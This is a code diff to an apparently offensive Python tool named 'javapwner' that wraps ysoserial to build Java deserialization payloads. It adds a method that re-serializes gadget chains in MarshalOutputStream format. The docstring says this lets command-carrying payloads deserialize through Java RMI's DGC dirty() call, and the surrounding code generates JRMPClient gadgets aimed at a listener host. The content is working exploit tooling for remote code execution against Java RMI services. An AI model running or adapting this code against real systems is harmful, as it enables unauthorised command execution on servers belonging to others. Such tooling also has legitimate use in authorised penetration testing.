@@ -16,9 +16,8 @@ import hashlib
 import os
 import re
 import subprocess
-from functools import cached_property, lru_cache
+from functools import cached_property
 from pathlib import Path
-from typing import Any
 
 from javapwner.exceptions import PayloadError
 
@@ -33,6 +32,7 @@ _TIMEOUT_GENERATE = 30  # seconds
 _YSOSERIAL_OPENS: tuple[str, ...] = (
     "--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED",
     "--add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED",
+    "--add-opens=java.base/java.util=ALL-UNNAMED",
 )
 
 # Module-level cache for detected Java major version (populated on first use).
@@ -291,6 +291,53 @@ class YsoserialWrapper:
     # ------------------------------------------------------------------
     # I.3 — JRMPClient gadget generation
     # ------------------------------------------------------------------
+
+    def generate_marshal_bytes(self, gadget: str, command: str) -> bytes:
+        """Generate a payload serialized via MarshalOutputStream.
+
+        Plain ysoserial output uses ObjectOutputStream, which writes empty class
+        annotations (TC_ENDBLOCKDATA only).  Java RMI's MarshalInputStream reads
+        the annotation with readObject(), so it expects TC_NULL before
+        TC_ENDBLOCKDATA.  This mismatch de-syncs the stream and prevents the
+        gadget from deserializing.
+
+        MarshalSerializer.java re-serializes the gadget using a custom inner
+        class that mirrors sun.rmi.server.MarshalOutputStream: it writes
+        writeObject(null) (→ TC_NULL) for every annotateClass() call.
+
+        Returns bytes starting with ACED0005 (full OOS stream), suitable for
+        passing to build_dgc_dirty_call() which strips the header and wraps
+        the content in the JRMP MSG_CALL / DGC dirty() structure.
+
+        Falls back to plain generate() if MarshalSerializer.class is absent.
+        """
+        lib_dir = Path(__file__).resolve().parent.parent.parent / "lib"
+        class_file = lib_dir / "MarshalSerializer.class"
+        if not class_file.is_file():
+            return self.generate(gadget, command)
+
+        cp = f"{lib_dir}{os.pathsep}{self._jar}"
+        cmd = (
+            ["java"] + _java_opens()
+            + ["-cp", cp, "MarshalSerializer", gadget, command]
+        )
+        try:
+            result = subprocess.run(
+                cmd, capture_output=True, timeout=_TIMEOUT_GENERATE,
+            )
+        except subprocess.TimeoutExpired as exc:
+            raise PayloadError(f"MarshalSerializer timed out after {_TIMEOUT_GENERATE}s") from exc
+        except FileNotFoundError as exc:
+            raise PayloadError("java binary not found in PATH") from exc
+
+        payload = result.stdout
+        if not payload or not payload.startswith(b"\xac\xed"):
+            stderr_text = result.stderr.decode(errors="replace") if result.stderr else ""
+            raise PayloadError(
+                f"MarshalSerializer returned invalid output for gadget '{gadget}'. "
+                f"Stderr: {stderr_text[:200]}"
+            )
+        return payload
 
     def generate_jrmp_client_gadget(self, listener_host: str, listener_port: int) -> bytes:
         """Generate a JRMPClient payload pointing to *listener_host:listener_port*.
